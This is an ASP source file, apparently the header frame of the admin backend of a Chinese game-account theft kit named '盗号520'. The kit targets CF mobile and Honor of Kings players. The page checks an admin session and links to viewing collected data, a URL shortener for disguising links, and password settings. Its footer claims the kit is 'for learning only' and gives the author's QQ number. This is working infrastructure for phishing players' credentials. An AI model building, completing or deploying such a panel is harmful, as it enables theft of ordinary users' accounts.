<!--#include file="conn.asp"-->
<%
set rs=server.createobject("adodb.recordset")
sql="select id,admin,password from admin order by id desc"
rs.open sql,conn,1,3

If session("admin")="" then
    Response.Write "<script>alert('用户未登录，请登录');top.location.href='index.asp';</SCRIPT>"
	Response.End
End If
%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>盗号520---CF手游and王者荣耀后台</title>

<style type="text/css">
<!--
.STYLE3 {color: #FF0000}
.STYLE4 {font-size: 12px; font-family: "宋体";}
-->
</style>
<style type="text/css">
A:link,A:active,A:visited{TEXT-DECORATION:none ;Color:#000099}
A:hover{TEXT-DECORATION: underline;Color:#00FF00}
BODY{
	FONT-SIZE: 12px;
	COLOR: #000000;
	FONT-FAMILY:  宋体;
	background-color: #000000;
	

	background-image: url(img/leaf.gif);
}
font{line-height : normal ;}

td { table-layout:fixed;
word-break :break-all; 
font-family:"宋体"; 
font-size: 12px;
line-height: 15px;
}
th
{
background-color: #877C59;
COLOR: #F4F2EC;
font-size: 12px;
font-weight:bold;
}
body,td,th {
	color: #FF0000;
	background: #00FF00;
}
.STYLE5 {color: #00FF00}
</style>
</head>

<body>
<div align="center">
  <table width="100%" height="26"  border="1" align="center" cellpadding="0" cellspacing="0" bordercolor="#B6E6FB">
    <tr>
      <td height="25" colspan="2" background="images/bg1.png"><table width="100%" border="0">
        <tr>
          <td><div align="left"><span class="STYLE3"><strong>&nbsp;盗号520---CF手游后台and王者荣耀管理中心</strong></span></div></td>
          <td><div align="right" class="STYLE3">
            <div align="left">欢迎您，<%=session("admin")%>！</div>
          </div></td>
        </tr>
      </table></td>
    </tr>
    <tr>
      <td bgcolor="white"><p><span class="STYLE3">　</span><span class="STYLE4"><a href="data.asp" target="main">查看数据</a></span><span class="STYLE3"><span class="STYLE4"> 　| 　<a href="addreg.asp" target="main">修改密码</a> 　| 　<a href="http://sscoo.com/" target="main">缩短地址</a> 　| 　</span></span><span class="STYLE4"><a href="about.asp" target="main">关于程序</a></span><span class="STYLE3"><span class="STYLE4"> 　|  　</span></span><span class="STYLE4 STYLE5"><a href="Exit.asp" target="_parent" ONCLICK="javascript:return confirm('提示：您确定要退出吗？')">安全退出</a></span></p>      </td>
    </tr>
    <tr>
      <td bgcolor="white"><div align="center"><span class="STYLE3">注意：该程序请勿非法使用,仅供学习! 乘风 QQ:744768811 </span> </div></td>
    </tr>
  </table>
</div>
</body>
</html>
